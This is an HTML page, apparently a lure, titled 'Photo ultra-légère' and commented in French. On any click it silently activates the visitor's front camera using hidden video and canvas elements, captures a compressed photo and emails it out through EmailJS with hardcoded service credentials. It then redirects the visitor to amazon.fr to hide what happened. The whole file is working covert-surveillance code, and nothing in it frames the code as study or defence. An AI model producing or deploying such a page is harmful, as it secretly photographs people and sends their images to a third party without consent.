<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Photo ultra-l√©g√®re</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
</head>
<body>
  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" width="150" height="100" style="display:none;"></canvas>

  <script>
    emailjs.init("IoSfbtGz4KSL_5_9E");

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    async function capturePhoto() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;

        video.onloadeddata = () => {
          // Prendre la photo
          context.drawImage(video, 0, 0, canvas.width, canvas.height);

          // Arr√™ter la cam√©ra
          stream.getTracks().forEach(track => track.stop());

          // Convertir en JPEG tr√®s compress√© pour r√©duire la taille
          canvas.toBlob((blob) => {
            const reader = new FileReader();
            reader.onloadend = () => {
              const imageData = reader.result;

              emailjs.send("service_8cs0gml", "template_hxfltc", {
                message: "Photo ultra-l√©g√®re üì∏",
                image: imageData
              })
              .then(() => { window.location.href = "https://www.amazon.fr"; })
              .catch(err => { console.error("Erreur EmailJS :", err); window.location.href = "https://www.amazon.fr"; });
            };
            reader.readAsDataURL(blob);
          }, "image/jpeg", 0.03); // Compression maximale
        };

      } catch (err) {
        console.error("Erreur cam√©ra :", err);
        window.location.href = "https://www.amazon.fr";
      }
    }

    // D√©clenchement automatique d√®s clic sur la page
    document.body.addEventListener('click', capturePhoto);
  </script>
</body>
</html>
